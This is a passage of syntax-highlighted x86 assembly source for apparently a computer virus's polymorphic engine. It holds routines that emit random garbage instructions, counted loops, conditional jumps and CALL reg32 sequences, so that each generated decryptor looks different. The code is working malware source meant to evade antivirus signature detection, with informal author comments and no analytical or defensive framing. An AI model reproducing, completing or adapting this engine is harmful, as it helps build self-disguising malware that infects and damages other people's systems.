        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_set_byte</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000010h</span><span class="sc0">       </span><span class="sc1">;we have 16 opcodes, haha..</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">;seta , setae, setb , setbe</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;sete , setg , setge, setl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;setle, setne, setno, setnp</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">         </span><span class="sc1">;setns, seto , setp , sets</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">a_set_byte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate garbage + loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_loop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; we can't be recursived because ECX is only for one LOOP</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_loop</span><span class="sc0">

        </span><span class="sc1">; does ECX free ?</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00000010b</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_loop</span><span class="sc0">

        </span><span class="sc1">; generate ECX like counter</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000030h</span><span class="sc0">       </span><span class="sc1">;future ECX to loop</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">        </span><span class="sc1">;write to ECX</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc1">; we don't want to change ECX</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00000010b</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;total garbages in bytes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">   </span><span class="sc1">;to calculate loop</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;loop has two bytes</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc0">         </span><span class="sc1">;loop identification</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc1">; enable ECX</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">11111101b</span><span class="sc0">

</span><span class="sc5">a_loop</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate reg + garbage + dec reg + jnz reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÄÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

        </span><span class="sc5">g_lj_reg</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;0=8bit, 1=16bit, 2=32bit</span><span class="sc0">
        </span><span class="sc5">g_lj_reg_past</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;0=low, 1=high (8BIT only)</span><span class="sc0">

</span><span class="sc5">g_loop_jump</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; we can't be recursived because ECX is only for one LOOP_JUMP</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_loop_jump</span><span class="sc0">

        </span><span class="sc1">; select a free register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_lj_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;8 bit ...</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__g_lj_no_8bit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">               </span><span class="sc1">;hi, lo ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_lj_reg_past</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__g_lj_okay</span><span class="sc0">

        </span><span class="sc1">; choose between reg16 and reg32</span><span class="sc0">
    </span><span class="sc5">__g_lj_no_8bit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">;reg16 or reg32 ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_lj_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc5">__g_lj_okay</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000030h</span><span class="sc0">       </span><span class="sc1">;how many to looping ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;used reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;disable register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4866h</span><span class="sc0">        </span><span class="sc1">;dec (reg16-clone)</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_lj_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__g_lj_dec_8bit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_lj_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__g_lj_dec_32bit</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc5">__g_lj_dec_32bit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__g_lj_dec_finish</span><span class="sc0">
    </span><span class="sc5">__g_lj_dec_8bit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C8FEh</span><span class="sc0">       </span><span class="sc1">;dec (reg8)</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;certain reg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_lj_reg_past</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__g_lj_dec_8bit_high</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__g_lj_dec_finish</span><span class="sc0">
    </span><span class="sc5">__g_lj_dec_8bit_high</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc5">__g_lj_dec_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;certain reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">        </span><span class="sc1">;JNZ identification</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc5">a_loop_jump</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate reg32 + call reg32 + rnd_block + pop reg32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function can generate CALL reg32 which will be gene-</span><span class="sc0">
        </span><span class="sc1">;rated by &lt;ppe_crypt_value&gt;.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">g_cr32_reg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">g_cr32_full</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;0=g_return,1=call,2=jump</span><span class="sc0">
        </span><span class="sc5">g_cr32_jump</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;address of CALL instruction</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">g_call_reg32</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_full</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">b_call_reg32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_jump</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">

        </span><span class="sc1">; test, if global index reg is generated</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">a_call_reg32</span><span class="sc0">

        </span><span class="sc1">; do not recursived - because it's few registers</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_call_reg32</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc1">; select an empty register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">

        </span><span class="sc1">; calculate size of rnd_block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000030h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">       </span><span class="sc1">;damn, fucking BUG !!</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;save it for later use</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">d_call_reg32</span><span class="sc0">
</span><span class="sc5">c_call_reg32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_full</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc5">d_call_reg32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">     </span><span class="sc1">;ebx is full</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">    </span><span class="sc1">;uaaahh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">   </span><span class="sc1">; + global index register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">

        </span><span class="sc1">; for &lt;g_iluzo_return&gt; we don't want to set right size</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_full</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">e_call_reg32</span><span class="sc0">

        </span><span class="sc1">; set the right size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc0">         </span><span class="sc1">; + call reg32 + (add/sub)</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cr32_add</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E881h</span><span class="sc0">       </span><span class="sc1">;sub reg32,imm32 id</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cr32_finish</span><span class="sc0">
    </span><span class="sc5">__cr32_add</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">       </span><span class="sc1">;add reg32,imm32 id</span><span class="sc0">
    </span><span class="sc5">__cr32_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
